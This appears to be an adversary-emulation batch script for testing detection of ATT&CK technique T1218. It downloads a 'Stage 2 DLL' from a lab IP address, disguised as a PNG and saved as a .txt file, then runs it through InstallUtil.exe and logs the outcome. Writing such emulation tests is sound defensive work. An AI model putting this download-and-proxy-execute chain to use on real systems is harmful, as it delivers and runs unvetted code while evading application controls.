@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random names, one per PHR_*)
SET aBcD1=%APPDATA%\12160\426ac704
SET eFgH2=6e83d1b1.txt
SET iJkL3=https://10.0.0.49/stage/2/icon.png?12160-7
SET mNoP4=ITZEL-S2B
SET qRsT5=12160
SET uVwX6=7
SET yZaB7=%PUBLIC%\\macula-simulations.log
SET CdEf8=https://10.0.0.49

REM Derived variables
set outdir=!aBcD1!
set outfile=!eFgH2!
set heartbeaturl=!iJkL3!
set agentname=!mNoP4!
set simid=!qRsT5!
set endpoint=!uVwX6!
set logfile=!yZaB7!

REM Debug timestamp cache
set tsvar=!DATE!/!TIME!

REM Step 1: Heartbeat fetch (download Stage 2 DLL)
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o "!outdir!\!outfile!" "!heartbeaturl!"
if !errorlevel! neq 0 (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_fail>> "!logfile!" 2>nul
    goto :cleanup
)
echo [!tsvar!][DEBUG][!agentname!][!simid!]: heartbeat_complete>> "!logfile!" 2>nul

REM Verify file exists
if not exist "!outdir!\!outfile!" (
    echo [!tsvar!][DEBUG][!agentname!][!simid!]: file_not_found>> "!logfile!" 2>nul
    goto :cleanup
)

REM Step 2: Change working directory
echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_start>> "!logfile!" 2>nul
cd /d "!outdir!" >nul 2>&1
echo [!tsvar!][DEBUG][!agentname!][!simid!]: chdir_result=!errorlevel!>> "!logfile!" 2>nul

REM Step 3: Invoke Stage 2 DLL via InstallUtil /U (LOLBIN)
echo [!tsvar!][DEBUG][!agentname!][!simid!]: installutil_start>> "!logfile!" 2>nul
"%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" /logfile= /LogToConsole=false /U "!outfile!" >NUL 2>&1
set installutil_exit=!errorlevel!
echo [!tsvar!][DEBUG][!agentname!][!simid!]: installutil_result=!installutil_exit!>> "!logfile!" 2>nul

REM Step 4: TTP logging with millisecond timestamp
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
if !installutil_exit! equ 0 (
    set result=OK
    set error=
) else (
    set result=FAIL
    set error=InstallUtil_error_!installutil_exit!
)
echo [!timestamp!][TTP][!agentname!][!simid!]: T1218^|System Binary Proxy Execution=[!result!]:[!error!]>> "!logfile!" 2>&1

:cleanup
endlocal
exit /b 0